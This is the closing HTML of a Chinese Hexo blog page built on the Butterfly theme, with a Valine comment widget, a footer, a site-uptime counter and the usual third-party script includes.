aria-hidden="true"></i><span> 评论</span></div><div class="vcomment" id="vcomment"></div><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;

window.valine = new Valine({
  el:'#vcomment',
  notify: true,
  verify: true,
  appId: 'z2GwNsG7RRpWpx5rt7psedl5-MdYXbMMI',
  appKey: 'gI6Yhfwz4JiUIv9546gepko8',
  placeholder: '来吧，造作吧，快活吧，肆无忌惮吧！(～￣▽￣)～',
  avatar: 'monsterid',
  meta: guest_info,
  pageSize: '10',
  lang: 'zh-cn',
  recordIP: false,
  serverURLs: ''
});</script></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By PanXiaoKang</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div><div class="footer_custom_text">小伙伴们好！欢迎来到<a href="https://panyongkang.github.io/" target="_blank" rel="noopener">向阳榆木</a>的博客！</div><div class="icp"><a href="http://www.beian.miit.gov.cn" target="_blank" rel="noopener"><img class="icp-icon" src="/img/icp.png"/><span>黔ICP备54587259号</span></a></div><div id="running-time"></div><script>setInterval(()=>{let create_time=Math.round(new Date(Date.UTC(2020,01,01,0,0,0)).getTime()/1000);let timestamp=Math.round((new Date().getTime()+8*60*60*1000)/1000);let second=timestamp-create_time;let time=new Array(0,0,0,0,0);if(second>=365*24*3600){time[0]=parseInt(second/(365*24*3600));second%=365*24*3600;}if(second>=24*3600){time[1]=parseInt(second/(24*3600));second%=24*3600;}if(second>=3600){time[2]=parseInt(second/3600);second%=3600;}if(second>=60){time[3]=parseInt(second/60);second%=60;}if(second>0){time[4]=second;}currentTimeHtml='本站已安全运行 '+time[0]+' 年 '+time[1]+' 天 '+time[2]+' 时 '+time[3]+' 分 '+time[4]+' 秒';document.getElementById("running-time").innerHTML=currentTimeHtml;},1000);</script></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="直达评论"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script id="canvas_nest" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="/js/third-party/canvas-nest.js"></script><script src="/js/third-party/activate-power-mode.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
document.body.addEventListener('input', POWERMODE);
</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><script src="/js/third-party/ClickShowText.js"></script><script src="/js/search/local-search.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/platelet.model.json"},"display":{"position":"right","width":200,"height":500},"mobile":{"show":true},"log":false});</script></body></html>